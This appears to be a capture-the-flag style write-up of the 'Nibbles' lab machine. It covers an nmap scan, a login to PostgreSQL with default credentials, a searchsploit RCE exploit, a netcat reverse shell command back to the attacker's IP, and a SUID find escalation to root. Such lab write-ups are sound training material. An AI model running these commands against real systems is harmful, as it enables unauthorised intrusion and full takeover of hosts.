---
icon: ubuntu
---

# Nibbles - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.225.47 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-30 17:39 EDT
Nmap scan report for 192.168.225.47
Host is up (0.031s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE  SERVICE      VERSION
21/tcp   open   ftp          vsftpd 3.0.3
22/tcp   open   ssh          OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:62:1f:f5:22:de:29:d4:24:96:a7:66:c3:64:b7:10 (RSA)
|   256 c9:15:ff:cd:f3:97:ec:39:13:16:48:38:c5:58:d7:5f (ECDSA)
|_  256 90:7c:a3:44:73:b4:b4:4c:e3:9c:71:d1:87:ba:ca:7b (ED25519)
80/tcp   open   http         Apache httpd 2.4.38 ((Debian))
|_http-title: Enter a title, displayed at the top of the window.
|_http-server-header: Apache/2.4.38 (Debian)
139/tcp  closed netbios-ssn
445/tcp  closed microsoft-ds
5437/tcp open   postgresql   PostgreSQL DB 11.3 - 11.9
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Not valid before: 2020-04-27T15:41:47
|_Not valid after:  2030-04-25T15:41:47
|_ssl-date: TLS randomness does not represent time
Aggressive OS guesses: Linux 5.0 - 5.14 (98%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (98%), Linux 4.15 - 5.19 (94%), Linux 2.6.32 - 3.13 (93%), Linux 5.0 (92%), OpenWrt 22.03 (Linux 5.10) (92%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (90%), Linux 4.15 (90%), Linux 2.6.32 - 3.10 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   32.90 ms 192.168.45.1
2   31.51 ms 192.168.45.254
3   33.02 ms 192.168.251.1
4   33.73 ms 192.168.225.47
```

### <mark style="color:$primary;">PostgreSQL Port 5437</mark>&#x20;

Nmap scan reveals a detailed version of postgreSQL

<figure><img src="../../.gitbook/assets/image (2260).png" alt=""><figcaption></figcaption></figure>

Searchsploit reveals an authenticated RCE, we don't have any credentials. Unless this database might be running on default credentials

```
psql -h 192.168.225.47 -U postgres -p 5437
```

<figure><img src="../../.gitbook/assets/image (2262).png" alt=""><figcaption></figcaption></figure>

Default credentials postgres:postgres work! And we can confirm the version as well!

### <mark style="color:$primary;">Authenticated PostgreSQL RCE v 11.7</mark>

I'll download the serachsploit exploit we found earlier:

```
searchsploit -m 50847
```

```
python3 50847.py -i 192.168.225.47 -U postgres -P postgres -p 5437 -c whoami 
```

<figure><img src="../../.gitbook/assets/image (2263).png" alt=""><figcaption></figcaption></figure>

This exploit works! Let's get a reverse shell!

```
python3 50847.py -i 192.168.225.47 -U postgres -P postgres -p 5437 -c 'which nc'
```

<figure><img src="../../.gitbook/assets/image (2264).png" alt=""><figcaption></figcaption></figure>

nc is available on the machine I will use it to get a reverse shell, make sure you have a listener ready before executing the following command:

```
python3 50847.py -i 192.168.225.47 -U postgres -P postgres -p 5437 -c '/usr/bin/nc 192.168.45.158 80 -e /bin/bash'
```

<figure><img src="../../.gitbook/assets/image (2265).png" alt=""><figcaption></figcaption></figure>

We got a reverse shell as postgres

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (2266).png" alt=""><figcaption></figcaption></figure>

besides postgres there are 2 more users with shells on this machine

### <mark style="color:$primary;">Find SUID</mark>

```
find / -perm -u=s -type f 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (2267).png" alt=""><figcaption></figcaption></figure>

Checking for SUID binaries we came across the <mark style="color:$info;">**find**</mark> [**gtobins** ](https://gtfobins.github.io/gtfobins/find/#suid)offers an easy way to privesc to root with the SUID bit set on <mark style="color:$info;">**find**</mark>

<figure><img src="../../.gitbook/assets/image (2268).png" alt=""><figcaption></figcaption></figure>

```
/usr/bin/find . -exec /bin/bash -p \; -quit
```

<figure><img src="../../.gitbook/assets/image (2269).png" alt=""><figcaption></figcaption></figure>

And we got a shell as root!&#x20;
